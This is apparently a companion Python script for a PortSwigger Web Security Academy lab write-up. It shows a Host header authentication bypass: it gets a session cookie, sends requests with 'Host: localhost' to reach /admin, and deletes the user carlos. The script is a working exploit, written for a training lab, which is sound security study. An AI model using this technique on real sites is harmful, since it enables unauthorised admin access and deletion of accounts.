#!/usr/bin/env python3
"""
Host header authentication bypass
PortSwigger Web Security Academy -- HTTP Host Header Attacks

Companion script for the writeup: 02-host-header-authentication-bypass.md

What this does:
    Visits the homepage first to pick up a session cookie (without one,
    Host: localhost returns 403, not the admin panel -- a prerequisite
    that's easy to miss), then requests /admin with Host: localhost using
    that same cookie jar. The access control here is keyed entirely off the
    Host header, so the server treats the request as originating internally
    and returns the admin panel. From there it deletes carlos the same way,
    still with Host: localhost, to solve the lab.

Usage:
    python 02-host-header-authentication-bypass.py <lab-url>
    e.g. python 02-host-header-authentication-bypass.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import sys
import httpx


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)

    client.get(lab_url)  # picks up the session cookie the bypass depends on
    print("[*] Session cookie obtained from homepage visit.")

    r = client.get(f"{lab_url}/admin", headers={"Host": "localhost"})
    print(f"[*] GET /admin with Host: localhost -- status={r.status_code}")

    has_admin = "admin" in r.text.lower() and (
        "delete" in r.text.lower() or "user" in r.text.lower()
    )
    if not has_admin:
        print("[-] Admin panel not reached -- check that the session cookie was set.")
        return
    print("[+] Admin panel reached via Host: localhost.")

    r = client.get(
        f"{lab_url}/admin/delete?username=carlos",
        headers={"Host": "localhost"},
    )
    print(f"[*] Delete carlos -- status={r.status_code}")

    if "Congratulations" in r.text:
        print("[+] Lab solved -- carlos deleted via Host header auth bypass.")
    else:
        check = client.get(lab_url)
        if "Congratulations" in check.text:
            print("[+] Lab solved -- carlos deleted via Host header auth bypass.")
        else:
            print("[-] Not solved yet -- inspect the delete response.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
